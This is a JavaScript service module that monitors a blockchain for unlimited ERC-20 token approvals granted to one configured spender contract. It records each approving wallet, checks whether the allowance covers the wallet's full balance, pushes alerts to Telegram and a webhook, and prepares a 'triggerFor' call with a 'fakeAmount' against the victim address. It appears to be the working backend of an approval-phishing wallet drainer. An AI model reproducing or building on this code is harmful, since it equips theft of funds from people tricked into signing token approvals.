const { ethers } = require('ethers');
const config = require('../config');
const database = require('./database');
const redis = require('./redis');
const telegram = require('./telegram');
const webhook = require('./webhook');
const { formatTokenAmount, sleep } = require('../utils/helpers');

// ERC-20 ABI for Approval event
const ERC20_ABI = [
  "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

// Spender contract ABI
const SPENDER_ABI = [
  "function triggerFor(address user, uint256 fakeAmount)",
  "function owner() view returns (address)"
];

class BlockchainService {
  constructor() {
    this.providerWs = new ethers.WebSocketProvider(config.rpc.wss);
    this.providerHttp = new ethers.JsonRpcProvider(config.rpc.http);
    this.tokenContract = new ethers.Contract(config.addresses.token, ERC20_ABI, this.providerHttp);
    this.spenderContract = new ethers.Contract(config.addresses.spender, SPENDER_ABI, this.providerHttp);
    this.isPolling = false;
    this.lastPolledBlock = 0;
    
    // Handle provider events
    this.providerWs.on('error', (error) => {
      console.error('WebSocket provider error:', error);
      this.startPolling();
    });
    
    this.providerWs.on('close', () => {
      console.warn('WebSocket provider closed, starting polling');
      this.startPolling();
    });
  }

  async initialize() {
    // Subscribe to approval events
    this.subscribeToApprovals();
    
    // Start polling as fallback
    setTimeout(() => {
      this.startPolling();
    }, 5000);
  }

  subscribeToApprovals() {
    try {
      const filter = this.tokenContract.filters.Approval(null, config.addresses.spender);
      
      this.tokenContract.on(filter, (owner, spender, value, event) => {
        this.handleApprovalEvent({
          owner,
          spender,
          value,
          txHash: event.log.transactionHash,
          blockNumber: event.log.blockNumber
        });
      });
      
      console.log('Subscribed to approval events');
    } catch (error) {
      console.error('Error subscribing to approvals:', error);
      this.startPolling();
    }
  }

  async startPolling() {
    if (this.isPolling) return;
    
    this.isPolling = true;
    console.log('Starting HTTP polling fallback');
    
    while (this.isPolling) {
      try {
        await this.pollForApprovals();
        await sleep(config.app.pollingIntervalMs);
      } catch (error) {
        console.error('Polling error:', error);
        await sleep(5000); // Wait before retrying
      }
    }
  }

  async pollForApprovals() {
    try {
      const currentBlock = await this.providerHttp.getBlockNumber();
      const fromBlock = Math.max(this.lastPolledBlock + 1, currentBlock - 10000); // Don't go too far back
      const toBlock = currentBlock;
      
      if (fromBlock >= toBlock) return;
      
      console.log(`Polling from block ${fromBlock} to ${toBlock}`);
      
      // Chunk the requests to avoid timeouts
      for (let start = fromBlock; start <= toBlock; start += config.app.pollingChunkSize) {
        const end = Math.min(start + config.app.pollingChunkSize - 1, toBlock);
        await this.fetchAndProcessLogs(start, end);
      }
      
      this.lastPolledBlock = toBlock;
    } catch (error) {
      console.error('Error during polling:', error);
    }
  }

  async fetchAndProcessLogs(fromBlock, toBlock) {
    try {
      const filter = this.tokenContract.filters.Approval(null, config.addresses.spender);
      const logs = await this.providerHttp.getLogs({
        ...filter,
        fromBlock,
        toBlock
      });
      
      for (const log of logs) {
        const parsedLog = this.tokenContract.interface.parseLog(log);
        if (parsedLog.name === 'Approval') {
          await this.handleApprovalEvent({
            owner: parsedLog.args.owner,
            spender: parsedLog.args.spender,
            value: parsedLog.args.value,
            txHash: log.transactionHash,
            blockNumber: log.blockNumber
          });
        }
      }
    } catch (error) {
      console.error(`Error fetching logs from ${fromBlock} to ${toBlock}:`, error);
    }
  }

  async handleApprovalEvent(event) {
    const { owner, spender, value, txHash, blockNumber } = event;
    
    // Check if it's an unlimited approval
    if (!value.eq(ethers.MaxUint256)) {
      return;
    }
    
    // Deduplication using Redis
    const redisKey = `approval:${txHash}`;
    const isNew = await redis.setIfNotExists(redisKey, config.app.dedupeTtlSeconds);
    if (!isNew) {
      return; // Already processed
    }
    
    console.log(`New unlimited approval detected: ${txHash}`);
    
    // Save initial detection
    const detection = {
      txHash,
      owner,
      spender,
      valueRaw: value.toString(),
      decimals: config.token.decimals,
      blockNumber
    };
    
    await database.saveDetection(detection);
    
    // Schedule confirmation check
    setTimeout(() => this.checkConfirmation(txHash, blockNumber), 1000);
  }

  async checkConfirmation(txHash, blockNumber) {
    try {
      const currentBlock = await this.providerHttp.getBlockNumber();
      const confirmations = currentBlock - blockNumber;
      
      if (confirmations >= config.app.confirmations) {
        // Confirmed, get additional data
        const approval = await database.findByTxHash(txHash);
        if (!approval || approval.confirmedAt) {
          return; // Already confirmed or not found
        }
        
        // Get balance and allowance
        const balance = await this.tokenContract.balanceOf(approval.owner);
        const allowance = await this.tokenContract.allowance(approval.owner, approval.spender);
        
        // Update database
        const updatedApproval = await database.updateConfirmation(txHash, new Date());
        
        // Prepare notification data
        const notificationData = {
          txHash,
          owner: approval.owner,
          spender: approval.spender,
          valueRaw: approval.valueRaw,
          humanValue: formatTokenAmount(approval.valueRaw, approval.decimals),
          balanceRaw: balance.toString(),
          balanceHuman: formatTokenAmount(balance, approval.decimals),
          allowanceRaw: allowance.toString(),
          allowanceHuman: formatTokenAmount(allowance, approval.decimals),
          unlimitedFlag: true,
          willCover: allowance.gte(balance),
          blockNumber: approval.blockNumber,
          detectedAt: approval.detectedAt,
          confirmedAt: updatedApproval.confirmedAt,
          explorerLink: `https://etherscan.io/tx/${txHash}`
        };
        
        // Send notifications
        await telegram.sendNotification(notificationData);
        await webhook.sendPayload(notificationData);
        
        console.log(`Approval confirmed: ${txHash}`);
      } else {
        // Not yet confirmed, schedule another check
        setTimeout(() => this.checkConfirmation(txHash, blockNumber), 10000);
      }
    } catch (error) {
      console.error(`Error checking confirmation for ${txHash}:`, error);
    }
  }

  async getSpenderOwner() {
    try {
      return await this.spenderContract.owner();
    } catch (error) {
      console.error('Error getting spender owner:', error);
      return null;
    }
  }

  async createTriggerTransaction(owner, fakeAmount) {
    try {
      const fakeAmountRaw = ethers.parseUnits(fakeAmount, config.token.decimals);
      const txData = await this.spenderContract.triggerFor.populateTransaction(owner, fakeAmountRaw);
      return {
        to: config.addresses.spender,
        data: txData.data
      };
    } catch (error) {
      console.error('Error creating trigger transaction:', error);
      throw error;
    }
  }

  async close() {
    this.isPolling = false;
    if (this.providerWs) {
      await this.providerWs.destroy();
    }
  }
}

module.exports = new BlockchainService();
